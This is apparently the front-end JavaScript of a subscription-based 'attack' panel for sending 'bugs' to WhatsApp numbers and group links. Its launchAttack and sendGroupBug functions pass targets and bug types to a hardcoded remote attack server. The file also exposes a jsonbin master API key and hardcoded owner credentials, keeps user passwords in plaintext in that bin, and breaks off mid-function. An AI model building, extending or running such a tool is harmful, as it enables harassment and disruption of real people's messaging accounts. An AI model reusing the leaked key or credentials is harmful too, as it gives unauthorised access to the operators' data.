/* ========== CONFIGURATION CONSTANTS ========== */
const BIN_ID = "688384cdae596e708fbb97e4";
const API_KEY = "$2a$10$55IAjRl7i3QlilxdTPmqx.5/Idiemz453V9zHKc76Z9q4jDPhvL.C";
const headers = {
  "Content-Type": "application/json",
  "X-Master-Key": API_KEY
};

const API_CONFIG = {
  STATUS_URL: "http://178.128.24.51:2001/status",
  ATTACK_URL: "http://178.128.24.51:2001/UltraXwebAPI",
  PAIRING_URL: "/api/pair",
  MAX_REQUESTS_PER_MINUTE: 5,
  REQUEST_TIMEOUT: 5000,
  PAIRING_TIMEOUT: 600 // 10 minutes in seconds
};

const SESSION_CONFIG = {
  TIMEOUT: 1800, // 30 minutes in seconds
  WARNING_TIME: 300 // 5 minutes before timeout
};

const VALIDATION_PATTERNS = {
  PHONE: /^[0-9]{10,15}$/,
  WHATSAPP_GROUP: /^https:\/\/chat\.whatsapp\.com\/[a-zA-Z0-9_-]+$/,
  USERNAME: /^[a-zA-Z0-9_]{3,20}$/,
  PASSWORD: /^.{6,}$/
};

const ROLE_CONFIG = {
  OWNER: {
    username: "dilxVXIIl",
    password: "19972",
    privileges: ['all']
  },
  ROLES: ['owner', 'admin', 'reseller', 'user']
};

/* ========== GLOBAL VARIABLES ========== */
let currentUser = null;
let localDeviceId = localStorage.getItem('device_id') || generateDeviceId();
localStorage.setItem('device_id', localDeviceId);
let apiToken = localStorage.getItem('api_token') || null;
let isApiPublic = false;
let isMaintenanceMode = false;

let requestCount = 0;
let lastRequestTimestamp = 0;
let inactivityTimer;
let pairingInterval;
let remainingPairingTime = 0;

/* ========== DOM ELEMENTS ========== */
const header = document.getElementById('header');
const hamburger = document.getElementById('hamburger');
const sideMenu = document.getElementById('sideMenu');
const menuOverlay = document.getElementById('menuOverlay');
const loginCard = document.getElementById('loginCard');
const dashboard = document.getElementById('dashboard');
const userBadge = document.getElementById('userBadge');
const currentRole = document.getElementById('currentRole');
const connectionStatus = document.getElementById('connectionStatus');

/* ========== INITIALIZATION ========== */
document.addEventListener('DOMContentLoaded', async () => {
  // Check if user is already logged in
  const user = JSON.parse(localStorage.getItem('currentUser'));
  if (user) {
    currentUser = user;
    await verifySession();
    showDashboard();
  }

  // Setup event listeners
  hamburger.addEventListener('click', toggleMenu);
  menuOverlay.addEventListener('click', toggleMenu);
  
  // Check system status
  await checkSystemStatus();
  
  // Initialize API status
  checkApiConnection();
  
  // Check for existing token
  if (apiToken) {
    document.getElementById('infoToken').textContent = `${apiToken.substring(0, 6)}...`;
    document.getElementById('tokenValue').textContent = apiToken;
    document.getElementById('tokenDisplay').classList.remove('hidden');
    document.querySelector('#pairingResult .status-value').textContent = 'Paired';
  }
});

/* ========== UTILITY FUNCTIONS ========== */
function generateDeviceId() {
  return 'd-' + Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15);
}

function generateToken() {
  return 't-' + [...Array(32)].map(() => Math.random().toString(36)[2]).join('');
}

function validateInput(input, type) {
  switch(type) {
    case 'phone': return VALIDATION_PATTERNS.PHONE.test(input);
    case 'whatsapp': return VALIDATION_PATTERNS.WHATSAPP_GROUP.test(input);
    case 'username': return VALIDATION_PATTERNS.USERNAME.test(input);
    case 'password': return VALIDATION_PATTERNS.PASSWORD.test(input);
    default: return false;
  }
}

function showNotification(message, type = 'success') {
  const notification = document.createElement('div');
  notification.className = `notification notification-${type}`;
  notification.innerHTML = `
    <i class="fas ${type === 'success' ? 'fa-check-circle' : type === 'error' ? 'fa-times-circle' : 'fa-exclamation-circle'}"></i>
    ${message}
  `;
  
  document.body.appendChild(notification);
  
  setTimeout(() => notification.style.opacity = '1', 100);
  setTimeout(() => {
    notification.style.opacity = '0';
    setTimeout(() => notification.remove(), 300);
  }, 5000);
}

function togglePassword(inputId) {
  const input = document.getElementById(inputId);
  const icon = input.nextElementSibling.querySelector('i');
  
  if (input.type === 'password') {
    input.type = 'text';
    icon.classList.replace('fa-eye', 'fa-eye-slash');
  } else {
    input.type = 'password';
    icon.classList.replace('fa-eye-slash', 'fa-eye');
  }
}

function toggleMenu() {
  sideMenu.classList.toggle('active');
  menuOverlay.classList.toggle('active');
}

function hideAllMenus() {
  document.querySelectorAll('.card').forEach(card => {
    if (!card.id.includes('loginCard') && !card.id.includes('dashboard')) {
      card.classList.add('hidden');
    }
  });
  toggleMenu();
}

function showMenu(menuId) {
  hideAllMenus();
  document.getElementById(menuId).classList.remove('hidden');
  
  if (menuId === 'adminListUsers') {
    loadUserList();
  } else if (menuId === 'ownerPanel') {
    loadOwnerPanel();
  }
}

function setButtonLoading(button, isLoading, loadingText = 'Processing...') {
  button.innerHTML = isLoading 
    ? `<i class="fas fa-spinner fa-spin"></i> ${loadingText}` 
    : button.getAttribute('data-original-text') || button.innerHTML;
  button.disabled = isLoading;
  if (!isLoading) return;
  
  // Save original button text if not already saved
  if (!button.hasAttribute('data-original-text')) {
    button.setAttribute('data-original-text', button.innerHTML);
  }
}

function copyToClipboard(text) {
  navigator.clipboard.writeText(text).then(() => {
    showNotification('Copied to clipboard!', 'success');
  }).catch(err => {
    console.error('Failed to copy:', err);
    showNotification('Failed to copy', 'error');
  });
}

/* ========== SESSION MANAGEMENT ========== */
async function verifySession() {
  try {
    const users = await getUsers();
    const user = users.find(u => u.username === currentUser.username);
    
    if (!user || user.device_id !== localDeviceId) {
      logout();
      return false;
    }
    
    // Check if account expired (except for owner)
    if (currentUser.role !== 'owner' && user.expired) {
      const today = new Date();
      const expiryDate = new Date(user.expired);
      if (expiryDate < today) {
        showNotification(`Account expired on ${user.expired}`, 'error');
        logout();
        return false;
      }
    }
    
    return true;
  } catch (error) {
    console.error('Session verification failed:', error);
    return false;
  }
}

function startInactivityTimer() {
  resetInactivityTimer();
  ['click', 'mousemove', 'keypress'].forEach(event => {
    document.addEventListener(event, resetInactivityTimer);
  });
}

function resetInactivityTimer() {
  clearTimeout(inactivityTimer);
  
  // Show warning 5 minutes before timeout
  setTimeout(() => {
    if (currentUser) showTimeoutWarning();
  }, (SESSION_CONFIG.TIMEOUT - SESSION_CONFIG.WARNING_TIME) * 1000);
  
  // Full timeout
  inactivityTimer = setTimeout(() => {
    showNotification('You have been logged out due to inactivity', 'warning');
    logout();
  }, SESSION_CONFIG.TIMEOUT * 1000);
}

function showTimeoutWarning() {
  if (!currentUser) return;
  
  const modal = document.getElementById('timeoutWarning');
  const counter = document.getElementById('timeoutCounter');
  let seconds = SESSION_CONFIG.WARNING_TIME;
  
  modal.classList.add('active');
  
  const countdown = setInterval(() => {
    seconds--;
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    counter.textContent = `${mins}:${secs < 10 ? '0' + secs : secs}`;
    
    if (seconds <= 0) {
      clearInterval(countdown);
      modal.classList.remove('active');
    }
  }, 1000);
  
  // Click anywhere to extend session
  const extendSession = () => {
    clearInterval(countdown);
    modal.classList.remove('active');
    resetInactivityTimer();
    showNotification('Session extended', 'success');
    document.removeEventListener('click', extendSession);
  };
  
  document.addEventListener('click', extendSession);
}

/* ========== API FUNCTIONS ========== */
async function checkSystemStatus() {
  try {
    const response = await fetch('/api/status');
    const data = await response.json();
    
    isApiPublic = data.isApiPublic || false;
    isMaintenanceMode = data.isMaintenanceMode || false;
    
    // Update UI
    document.getElementById('maintenanceStatus').className = isMaintenanceMode ? 'status-warning' : 'status-connected';
    document.getElementById('maintenanceStatus').innerHTML = isMaintenanceMode 
      ? '<i class="fas fa-exclamation-circle"></i> Active' 
      : '<i class="fas fa-check-circle"></i> Inactive';
    
    document.getElementById('apiModeToggle').checked = isApiPublic;
    document.getElementById('maintenanceToggle').checked = isMaintenanceMode;
    
    return data;
  } catch (error) {
    console.error('Failed to check system status:', error);
    return { isApiPublic: false, isMaintenanceMode: false };
  }
}

async function checkApiConnection() {
  const statusElement = document.getElementById('apiStatus') || document.getElementById('apiLoginStatus');
  
  try {
    const controller = new AbortController();
    const timeoutId = setTimeout(() => controller.abort(), API_CONFIG.REQUEST_TIMEOUT);

    const response = await fetch(API_CONFIG.STATUS_URL, { signal: controller.signal });
    clearTimeout(timeoutId);
    
    const data = await response.json();
    
    const statusClass = data.connected ? 'status-connected' : 'status-disconnected';
    const statusText = data.connected ? 'Connected' : 'Disconnected';
    const statusIcon = data.connected ? 'fa-check-circle' : 'fa-times-circle';
    
    if (statusElement) {
      statusElement.className = statusClass;
      statusElement.innerHTML = `<i class="fas ${statusIcon}"></i> ${statusText}`;
    }
    
    // Update dashboard status
    if (document.getElementById('infoApiStatus')) {
      document.getElementById('infoApiStatus').className = statusClass;
      document.getElementById('infoApiStatus').textContent = statusText;
    }
    
    // Update connection indicator
    if (connectionStatus) {
      connectionStatus.className = `fas fa-circle ${statusClass}`;
    }
    
    return data.connected === true;
  } catch (error) {
    console.error('API connection check failed:', error);
    if (statusElement) {
      statusElement.className = 'status-disconnected';
      statusElement.innerHTML = '<i class="fas fa-times-circle"></i> Connection Failed';
    }
    return false;
  }
}

async function getUsers() {
  try {
    const response = await fetch(`https://api.jsonbin.io/v3/b/${BIN_ID}/latest`, { headers });
    const data = await response.json();
    return data.record || [];
  } catch (error) {
    console.error('Error fetching users:', error);
    return [];
  }
}

async function updateUsers(users) {
  try {
    const response = await fetch(`https://api.jsonbin.io/v3/b/${BIN_ID}`, {
      method: 'PUT',
      headers,
      body: JSON.stringify(users)
    });
    return await response.json();
  } catch (error) {
    console.error('Error updating users:', error);
    return null;
  }
}

/* ========== AUTH FUNCTIONS ========== */
async function login() {
  const username = document.getElementById('username').value.trim();
  const password = document.getElementById('password').value.trim();
  const loginResult = document.getElementById('loginResult');
  const loginBtn = document.getElementById('loginBtn');

  loginResult.innerHTML = '';
  loginResult.style.color = '';

  if (!username || !password) {
    showError(loginResult, 'Please enter both username and password');
    return;
  }

  // Check maintenance mode
  if (isMaintenanceMode && username !== ROLE_CONFIG.OWNER.username) {
    showError(loginResult, 'System is under maintenance. Only owner can login.');
    return;
  }

  setButtonLoading(loginBtn, true);

  try {
    const users = await getUsers();
    
    // Check hardcoded owner credentials
    if (username === ROLE_CONFIG.OWNER.username && password === ROLE_CONFIG.OWNER.password) {
      currentUser = {
        username,
        password,
        role: 'owner',
        device_id: localDeviceId,
        telegram_id: null,
        expired: null
      };
      
      localStorage.setItem('currentUser', JSON.stringify(currentUser));
      showSuccess(loginResult, `Welcome back, Owner!`);
      setTimeout(showDashboard, 1000);
      return;
    }

    const user = users.find(u => u.username === username && u.password === password);

    if (!user) {
      showError(loginResult, 'Invalid username or password');
      return;
    }

    if (user.device_id && user.device_id !== localDeviceId) {
      showError(loginResult, `Account is active on another device (ID: ${user.device_id})`);
      return;
    }

    if (user.role !== 'owner' && user.expired) {
      const today = new Date();
      const expiryDate = new Date(user.expired);
      if (expiryDate < today) {
        showError(loginResult, `Account expired on ${user.expired}. Please renew.`);
        return;
      }
    }

    const updatedUser = { ...user, device_id: localDeviceId };
    const updatedUsers = users.map(u => u.username === username ? updatedUser : u);
    await updateUsers(updatedUsers);

    currentUser = updatedUser;
    localStorage.setItem('currentUser', JSON.stringify(updatedUser));
    
    showSuccess(loginResult, `Welcome back, ${username}!`);
    setTimeout(showDashboard, 1000);

  } catch (error) {
    console.error('Login error:', error);
    showError(loginResult, `System error: ${error.message || 'Please try again later'}`);
  } finally {
    setButtonLoading(loginBtn, false);
  }
}

async function logout() {
  try {
    if (currentUser) {
      const users = await getUsers();
      const updatedUsers = users.map(u => {
        if (u.username === currentUser.username) {
          return { ...u, device_id: '' };
        }
        return u;
      });
      await updateUsers(updatedUsers);
      
      // Send Telegram notification
      if (currentUser.telegram_id) {
        await fetch('/api/telegram', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chatId: currentUser.telegram_id,
            text: `User ${currentUser.username} logged out from device ${localDeviceId}`
          })
        });
      }
    }
  } catch (error) {
    console.error('Error during logout:', error);
  } finally {
    currentUser = null;
    localStorage.removeItem('currentUser');
    localStorage.removeItem('api_token');
    header.classList.add('hidden');
    loginCard.classList.remove('hidden');
    dashboard.classList.add('hidden');
    hideAllMenus();
    document.getElementById('username').value = '';
    document.getElementById('password').value = '';
    clearInterval(pairingInterval);
  }
}

/* ========== USER MANAGEMENT ========== */
async function resetPassword() {
  const newPassword = document.getElementById('newPassword').value;
  const resetPassBtn = document.getElementById('resetPassBtn');
  const myInfoResult = document.getElementById('myInfoResult');

  if (!validateInput(newPassword, 'password')) {
    myInfoResult.innerHTML = 'Password must be at least 6 characters';
    myInfoResult.style.color = '#f44336';
    return;
  }

  setButtonLoading(resetPassBtn, true, 'Updating...');

  try {
    const users = await getUsers();
    const updatedUsers = users.map(u => {
      if (u.username === currentUser.username) {
        return { ...u, password: newPassword };
      }
      return u;
    });

    await updateUsers(updatedUsers);

    currentUser.password = newPassword;
    localStorage.setItem('currentUser', JSON.stringify(currentUser));

    myInfoResult.innerHTML = 'Password updated successfully';
    myInfoResult.style.color = 'var(--main)';
    document.getElementById('newPassword').value = '';
    
    // Send Telegram notification
    if (currentUser.telegram_id) {
      await fetch('/api/telegram', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chatId: currentUser.telegram_id,
          text: `Password changed for user ${currentUser.username}`
        })
      });
    }
  } catch (error) {
    myInfoResult.innerHTML = 'Error updating password: ' + error.message;
    myInfoResult.style.color = '#f44336';
  } finally {
    setButtonLoading(resetPassBtn, false);
  }
}

/* ========== PAIRING FUNCTIONS ========== */
async function generatePairing() {
  if (!currentUser) {
    showNotification('Please login first', 'error');
    return;
  }

  const number = prompt(`Enter WhatsApp number for pairing (62xxx):`);
  if (!number || !number.startsWith('62')) {
    showNotification('Please enter a valid Indonesian number (62xxx)', 'error');
    return;
  }

  const pairingResult = document.getElementById('pairingResult');
  const pairingBtn = document.getElementById('pairingBtn');
  
  try {
    pairingResult.innerHTML = '<div class="status-header">Status: <span class="status-value">Initializing...</span></div>';
    document.getElementById('pairingProgress').classList.remove('hidden');
    setButtonLoading(pairingBtn, true, 'Generating...');
    
    const response = await fetch(API_CONFIG.PAIRING_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        number,
        username: currentUser.username,
        deviceId: localDeviceId
      })
    });
    
    if (!response.ok) {
      throw new Error(await response.text());
    }

    const data = await response.json();
    
    if (!data.success) {
      throw new Error(data.message || 'Failed to start pairing');
    }
    
    // Show pairing code
    pairingResult.innerHTML = `
      <div class="status-header">Status: <span class="status-value">Pairing in progress</span></div>
      <div class="pairing-code">Code: <strong>${data.code}</strong></div>
    `;
    
    // Start pairing progress
    startPairingProgress(data.code, number);
    
    // Generate and store API token
    apiToken = generateToken();
    localStorage.setItem('api_token', apiToken);
    
    // Update UI
    document.getElementById('infoToken').textContent = `${apiToken.substring(0, 6)}...`;
    document.getElementById('tokenValue').textContent = apiToken;
    document.getElementById('tokenDisplay').classList.remove('hidden');
    
    // Update user in database with telegram_id
    const users = await getUsers();
    const updatedUsers = users.map(u => {
      if (u.username === currentUser.username) {
        return { ...u, telegram_id: data.telegram_id };
      }
      return u;
    });
    await updateUsers(updatedUsers);
    
    currentUser.telegram_id = data.telegram_id;
    localStorage.setItem('currentUser', JSON.stringify(currentUser));
    
    showNotification('Pairing code generated! Check your WhatsApp', 'success');
  } catch (error) {
    pairingResult.innerHTML = `<div class="status-header">Status: <span class="status-value">Error</span></div>
                              <div class="error-message">${error.message || 'Pairing failed'}</div>`;
    showNotification('Pairing failed: ' + error.message, 'error');
    console.error('Pairing error:', error);
  } finally {
    setButtonLoading(pairingBtn, false);
  }
}

function startPairingProgress(code, number) {
  const progressFill = document.getElementById('pairingProgressFill');
  const progressText = document.getElementById('pairingProgressText');
  
  remainingPairingTime = API_CONFIG.PAIRING_TIMEOUT;
  
  // Clear any existing interval
  clearInterval(pairingInterval);
  
  pairingInterval = setInterval(() => {
    remainingPairingTime--;
    const percentage = 100 - (remainingPairingTime / API_CONFIG.PAIRING_TIMEOUT * 100);
    progressFill.style.width = `${percentage}%`;
    
    const minutes = Math.floor(remainingPairingTime / 60);
    const seconds = remainingPairingTime % 60;
    progressText.textContent = `Expires in: ${minutes}:${seconds < 10 ? '0' + seconds : seconds}`;
    
    if (remainingPairingTime <= 0) {
      clearInterval(pairingInterval);
      progressText.textContent = 'Pairing code expired';
      document.querySelector('#pairingResult .status-value').textContent = 'Expired';
      showNotification('Pairing code expired', 'warning');
    }
  }, 1000);
  
  // Check pairing status periodically
  const checkPairingStatus = async () => {
    try {
      const response = await fetch(`${API_CONFIG.PAIRING_URL}?code=${code}`);
      const data = await response.json();
      
      if (data.paired) {
        clearInterval(pairingInterval);
        document.querySelector('#pairingResult .status-value').textContent = 'Paired';
        progressText.textContent = 'Successfully paired!';
        progressFill.style.width = '100%';
        progressFill.style.backgroundColor = 'var(--main)';
        
        showNotification('WhatsApp successfully paired!', 'success');
        
        // Update user in database with pairing status
        const users = await getUsers();
        const updatedUsers = users.map(u => {
          if (u.username === currentUser.username) {
            return { ...u, paired: true, paired_at: new Date().toISOString() };
          }
          return u;
        });
        await updateUsers(updatedUsers);
        
        currentUser.paired = true;
        localStorage.setItem('currentUser', JSON.stringify(currentUser));
      }
    } catch (error) {
      console.error('Error checking pairing status:', error);
    }
  };
  
  const statusInterval = setInterval(checkPairingStatus, 5000);
  
  // Clear status check when pairing expires
  setTimeout(() => {
    clearInterval(statusInterval);
  }, API_CONFIG.PAIRING_TIMEOUT * 1000);
}

function copyToken() {
  const token = document.getElementById('tokenValue').textContent;
  copyToClipboard(token);
}

/* ========== ATTACK FUNCTIONS ========== */
async function launchAttack() {
  const now = Date.now();
  if (now - lastRequestTimestamp > 60000) {
    requestCount = 0;
    lastRequestTimestamp = now;
  }
  
  if (requestCount >= API_CONFIG.MAX_REQUESTS_PER_MINUTE) {
    showNotification('Too many requests. Please wait before trying again.', 'error');
    return;
  }
  
  const targetNumber = document.getElementById('targetNumber').value.trim();
  if (!validateInput(targetNumber, 'phone')) {
    showNotification('Invalid phone number format (10-15 digits required)', 'error');
    return;
  }
  
  const bugType = document.getElementById('bugType').value;
  const attackBtn = document.getElementById('attackBtn');
  const attackResult = document.getElementById('attackResult');

  setButtonLoading(attackBtn, true, 'Launching...');

  try {
    const isConnected = await checkApiConnection();
    if (!isConnected) {
      showNotification('API is currently unavailable', 'error');
      return;
    }

    // Check if API is in private mode and user has valid token
    if (!isApiPublic && !apiToken) {
      showNotification('API is in private mode. Please pair your WhatsApp first.', 'error');
      return;
    }

    const response = await fetch(`${API_CONFIG.ATTACK_URL}?chatId=${encodeURIComponent(targetNumber)}&type=${bugType}${apiToken ? `&token=${apiToken}` : ''}`);
    
    if (!response.ok) throw new Error("Failed to connect to attack server");

    const result = await response.json();
    
    if (result.success) {
      showNotification('Attack launched successfully!', 'success');
      attackResult.innerHTML = `Attack launched successfully against ${targetNumber}`;
      attackResult.style.color = 'var(--main)';
      
      // Update rate limit counter
      requestCount++;
      document.getElementById('rateLimitCounter').textContent = requestCount;
    } else {
      showNotification(result.message || 'Attack failed', 'error');
      attackResult.innerHTML = result.message || 'Attack failed';
      attackResult.style.color = '#f44336';
    }
  } catch (error) {
    showNotification('Attack failed: ' + error.message, 'error');
    attackResult.innerHTML = 'Attack failed: ' + error.message;
    attackResult.style.color = '#f44336';
  } finally {
    setButtonLoading(attackBtn, false);
  }
}

async function sendGroupBug() {
  const groupLink = document.getElementById('whatsappGroup').value.trim();
  const bugType = document.getElementById('whatsappBugType').value;
  const attackBtn = document.getElementById('whatsappAttackBtn');
  const resultElement = document.getElementById('attackResult');

  if (!validateInput(groupLink, 'whatsapp')) {
    showNotification('Invalid WhatsApp group link format', 'error');
    return;
  }

  setButtonLoading(attackBtn, true, 'Sending...');

  try {
    const isConnected = await checkApiConnection();
    if (!isConnected) {
      showNotification('API is currently unavailable', 'error');
      return;
    }

    // Check if API is in private mode and user has valid token
    if (!isApiPublic && !apiToken) {
      showNotification('API is in private mode. Please pair your WhatsApp first.', 'error');
      return;
    }

    const response = await fetch(`${API_CONFIG.ATTACK_URL}?groupLink=${encodeURIComponent(groupLink)}&type=${bugType}${apiToken ? `&token=${apiToken}` : ''}`);
    
    if (!response.ok) throw new Error(await response.text() || "Failed to connect to server");

    const result = await response.json();
    if (result.success) {
      showNotification('Bug successfully sent to WhatsApp group!', 'success');
      resultElement.innerHTML = `Bug sent to group: ${groupLink}`;
      resultElement.style.color = 'var(--main)';
    } else {
      showNotification(result.message || 'Failed to send bug', 'error');
      resultElement.innerHTML = result.message || 'Failed to send bug';
      resultElement.style.color = '#f44336';
    }
  } catch (error) {
    showNotification(`Error: ${error.message}`, 'error');
    resultElement.innerHTML = `Error: ${error.message}`;
    resultElement.style.color = '#f44336';
  } finally {
    setButtonLoading(attackBtn, false);
  }
}

function switchAttackType(type) {
  const phoneSection = document.getElementById('phoneAttackSection');
  const whatsappSection = document.getElementById('whatsappAttackSection');
  
  if (type === 'phone') {
    phoneSection.classList.remove('hidden');
    whatsappSection.classList.add('hidden');
  } else {
    phoneSection.classList.add('hidden');
    whatsappSection.classList.remove('hidden');
  }
  
  document.getElementById('attackResult').innerHTML = '';
  checkApiConnection();
}

/* ========== ADMIN FUNCTIONS ========== */
async function createUser() {
  const username = document.getElementById('newUsername').value;
  const password = document.getElementById('newUserPassword').value;
  const role = document.getElementById('newUserRole').value;
  const days = parseInt(document.getElementById('newUserDays').value);
  const createUserBtn = document.getElementById('createUserBtn');
  const createUserResult = document.getElementById('createUserResult');

  if (!validateInput(username, 'username') || !validateInput(password, 'password') || isNaN(days)) {
    createUserResult.innerHTML = 'Please fill all fields correctly';
    createUserResult.style.color = '#f44336';
    return;
  }

  // Permission checks
  if (currentUser.role === 'reseller' && (role !== 'user' || days > 30)) {
    createUserResult.innerHTML = 'Resellers can only create user accounts with max 30 days';
    createUserResult.style.color = '#f44336';
    return;
  }

  if (currentUser.role === 'admin' && role === 'owner') {
    createUserResult.innerHTML = 'Admins cannot create owner accounts';
    createUserResult.style.color = '#f44336';
    return;
  }

  setButtonLoading(createUserBtn, true, 'Creating...');

  try {
    const users = await getUsers();
    
    if (users.some(u => u.username === username)) {
      createUserResult.innerHTML = 'Username already exists';
      createUserResult.style.color = '#f44336';
      return;
    }

    const expiredDate = new Date();
    expiredDate.setDate(expiredDate.getDate() + days);

    const newUser = {
      username,
      password,
      role,
      telegram_id: null,
      device_id: '',
      expired: expiredDate.toISOString().split('T')[0],
      created_by: currentUser.username,
      created_at: new Date().toISOString()
    };

    const updatedUsers = [...users, newUser];
    await updateUsers(updatedUsers);

    createUserResult.innerHTML = `User ${username} created successfully`;
    createUserResult.style.color = 'var(--main)';
    
    // Reset form
    document.getElementById('newUsername').value = '';
    document.getElementById('newUserPassword').value = '';
    document.getElementById('newUserDays').value = '30';
    
    // Send Telegram notification
    if (currentUser.telegram_id) {
      await fetch('/api/telegram', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chatId: currentUser.telegram_id,
          text: `New ${role} account created: ${username} (Expires: ${newUser.expired})`
        })
      });
    }
  } catch (error) {
    createUserResult.innerHTML = 'Error creating user: ' + error.message;
    createUserResult.style.color = '#f44336';
  } finally {
    setButtonLoading(createUserBtn, false);
  }
}

async function deleteUser(username) {
  if (!confirm(`Are you sure you want to delete user ${username}?`)) return;

  try {
    const users = await getUsers();
    const updatedUsers = users.filter(u => u.username !== username);
    await updateUsers(updatedUsers);
    
    if (currentUser.username === username) {
      logout();
    } else {
      loadUserList();
    }
    
    // Send Telegram notification
    if (currentUser.telegram_id) {
      await fetch('/api/telegram', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chatId: currentUser.telegram_id,
          text: `User account deleted: ${username}`
        })
      });
    }
  } catch (error) {
    console.error('Error deleting user:', error);
    showNotification('Failed to delete user', 'error');
  }
}

async function addDaysToUser(username) {
  const days = prompt('Enter number of days to add:', '30');
  if (!days || isNaN(days)) return;

  try {
    const users = await getUsers();
    const user = users.find(u => u.username === username);
    if (!user) return;

    const expiredDate = new Date(user.expired || new Date());
    expiredDate.setDate(expiredDate.getDate() + parseInt(days));

    const updatedUsers = users.map(u => 
      u.username === username ? { ...u, expired: expiredDate.toISOString().split('T')[0] } : u
    );

    await updateUsers(updatedUsers);
    loadUserList();
    showNotification(`Added ${days} days to ${username}`, 'success');
    
    // Send Telegram notification
    if (currentUser.telegram_id && user.telegram_id) {
      await fetch('/api/telegram', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chatId: user.telegram_id,
          text: `Your account has been extended by ${days} days. New expiry: ${expiredDate.toISOString().split('T')[0]}`
        })
      });
    }
  } catch (error) {
    console.error('Error adding days:', error);
    showNotification('Failed to add days', 'error');
  }
}

async function changeUserRole(username) {
  const role = prompt('Enter new role (admin/reseller/user):', 'user');
  if (!role || !ROLE_CONFIG.ROLES.includes(role)) return;

  try {
    const users = await getUsers();
    const updatedUsers = users.map(u => 
      u.username === username ? { ...u, role } : u
    );

    await updateUsers(updatedUsers);
    loadUserList();
    showNotification(`Changed role for ${username} to ${role}`, 'success');
    
    // Send Telegram notification
    if (currentUser.telegram_id) {
      const user = users.find(u => u.username === username);
      if (user && user.telegram_id) {
        await fetch('/api/telegram', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chatId: user.telegram_id,
            text: `Your account role has been changed to ${role}`
          })
        });
      }
    }
  } catch (error) {
    console.error('Error changing role:', error);
    showNotification('Failed to change role', 'error');
  }
}

async function changeUsername(oldUsername) {
  const newUsername = prompt('Enter new username:', oldUsername);
  if (!newUsername || newUsername === oldUsername) return;

  if (!validateInput(newUsername, 'username')) {
    showNotification('Username must be 3-20 chars (a-z, 0-9, _)', 'error');
    return;
  }

  try {
    const users = await getUsers();
    if (users.some(u => u.username === newUsername)) {
      showNotification('Username already exists', 'error');
      return;
    }

    const updatedUsers = users.map(u => 
      u.username === oldUsername ? { ...u, username: newUsername } : u
    );

    await updateUsers(updatedUsers);
    
    if (currentUser.username === oldUsername) {
      currentUser.username = newUsername;
      localStorage.setItem('currentUser', JSON.stringify(currentUser));
      document.getElementById('infoUsername').textContent = newUsername;
    }
    
    loadUserList();
    showNotification(`Username changed from ${oldUsername} to ${newUsername}`, 'success');
  } catch (error) {
    console.error('Error changing username:', error);
    showNotification('Failed to change username', 'error');
  }
}

async function changeUserPassword(username) {
  const newPassword = prompt('Enter new password:');
  if (!newPassword || !validateInput(newPassword, 'password')) {
    showNotification('Password must be at least 6 characters', 'error');
    return;
  }

  try {
    const users = await getUsers();
    const updatedUsers = users.map(u => 
      u.username === username ? { ...u, password: newPassword } : u
    );

    await updateUsers(updatedUsers);
    showNotification(`Password changed for ${username}`, 'success');
    
    // Send Telegram notification
    if (currentUser.telegram_id) {
      const user = users.find(u => u.username === username);
      if (user && user.telegram_id) {
        await fetch('/api/telegram', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chatId: user.telegram_id,
            text: `Your password has been changed by admin`
          })
        });
      }
    }
  } catch (error) {
    console.error('Error changing password:', error);
    showNotification('Failed to change password', 'error');
  }
}

async function resetDeviceId(username) {
  if (!confirm(`Reset device ID for ${username}? This will log them out.`)) return;

  try {
    const users = await getUsers();
    const updatedUsers = users.map(u => 
      u.username === username ? { ...u, device_id: '' } : u
    );

    await updateUsers(updatedUsers);
    loadUserList();
    showNotification(`Device ID reset for ${username}`, 'success');
  } catch (error) {
    console.error('Error resetting device ID:', error);
    showNotification('Failed to reset device ID', 'error');
  }
}

/* ========== OWNER FUNCTIONS ========== */
async function loadOwnerPanel() {
  if (currentUser?.role !== 'owner') return;
  
  try {
    const status = await checkSystemStatus();
    document.getElementById('apiModeToggle').checked = status.isApiPublic;
    document.getElementById('maintenanceToggle').checked = status.isMaintenanceMode;
  } catch (error) {
    console.error('Error loading owner panel:', error);
  }
}

async function toggleApiMode() {
  if (currentUser?.role !== 'owner') return;
  
  const toggle = document.getElementById('apiModeToggle');
  const isPublic = toggle.checked;
  
  try {
    const response = await fetch('/api/toggle-api-mode', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ isPublic })
    });
    
    const result = await response.json();
    if (result.success) {
      isApiPublic = isPublic;
      showNotification(`API mode set to ${isPublic ? 'Public' : 'Private'}`, 'success');
    } else {
      toggle.checked = !isPublic;
      showNotification(result.message || 'Failed to update API mode', 'error');
    }
  } catch (error) {
    toggle.checked = !isPublic;
    console.error('Error toggling API mode:', error);
    showNotification('Failed to update API mode', 'error');
  }
}

async function toggleMaintenance() {
  if (currentUser?.role !== 'owner') return;
  
  const toggle = document.getElementById('maintenanceToggle');
  const isMaintenance = toggle.checked;
  
  try {
    const response = await fetch('/api/toggle-maintenance', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ isMaintenance })
    });
    
    const result = await response.json();
    if (result.success) {
      isMaintenanceMode = isMaintenance;
      showNotification(`Maintenance mode ${isMaintenance ? 'enabled' : 'disabled'}`, 'success');
    } else {
      toggle.checked = !isMaintenance;
      showNotification(result.message || 'Failed to update maintenance mode', 'error');
    }
  } catch (error) {
    toggle.checked = !isMaintenance;
    console.error('Error toggling maintenance mode:', error);
    showNotification('Failed to update maintenance mode', 'error');
  }
}

async function clearAllSessions() {
  if (currentUser?.role !== 'owner') return;
  if (!confirm('This will log out all users. Continue?')) return;
  
  try {
    const users = await getUsers();
    const updatedUsers = users.map(u => ({ ...u, device_id: '' }));
    
    await updateUsers(updatedUsers);
    
    // Only logout current user if they're not owner
    if (currentUser.role !== 'owner') {
      logout();
    }
    
    showNotification('All user sessions cleared', 'success');
